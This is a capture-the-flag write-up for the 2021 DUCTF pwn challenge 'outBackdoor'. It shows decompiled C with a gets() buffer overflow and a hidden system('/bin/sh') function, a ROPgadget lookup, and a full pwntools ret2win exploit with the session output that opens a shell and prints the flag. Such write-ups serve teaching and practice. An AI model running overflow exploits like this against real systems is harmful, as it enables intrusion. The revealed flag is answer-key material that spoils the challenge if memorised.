# outBackdoor
**Category: Pwn**

Let's pop this into Ghidra:

```c
undefined8 main(void)

{
  char local_18 [16];
  
  buffer_init();
  puts("\nFool me once, shame on you. Fool me twice, shame on me.");
  puts("\nSeriously though, what features would be cool? Maybe it could play a song?");
  gets(local_18);
  return 0;
}

void outBackdoor(void)

{
  puts("\n\nW...w...Wait? Who put this backdoor out back here?");
  system("/bin/sh");
  return;
}
```

We'll make use of the vulnerable `gets` function to overflow `local_18` to the point where we can overwrite the `main` function's return address.

There's an extra note that we need to align the stack as part of our exploit. [Stackoverflow](https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call) explains this, but the short version is that we need to add an extra `ret` to our payload to prevent a segfault.

ROPgadget can be used to find the address of a `ret` call:
```
$ ROPgadget --binary outBackdoor | grep ': ret'
0x0000000000401016 : ret
0x000000000040117a : ret 0xfffe
0x0000000000401062 : retf 0x2f
```

Final exploit:

```python
from pwn import *

context.binary = ELF('./outBackdoor')

if args.REMOTE:
    io = remote('pwn-2021.duc.tf', 31921)
else:
    io = process(context.binary.path)

buffer = b'A' * (16 + 8)
ret = p64(0x401016) # ret command found from ROPgadget
functionAddress = p64(context.binary.sym.outBackdoor)

io.sendline(flat(buffer, ret, functionAddress))
io.interactive()
```

```
$ ./exploit.py REMOTE
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to pwn-2021.duc.tf on port 31921: Done
[*] Switching to interactive mode

Fool me once, shame on you. Fool me twice, shame on me.

Seriously though, what features would be cool? Maybe it could play a song?


W...w...Wait? Who put this backdoor out back here?
$ ls
flag.txt
pwn
$ cat flag.txt
DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}
```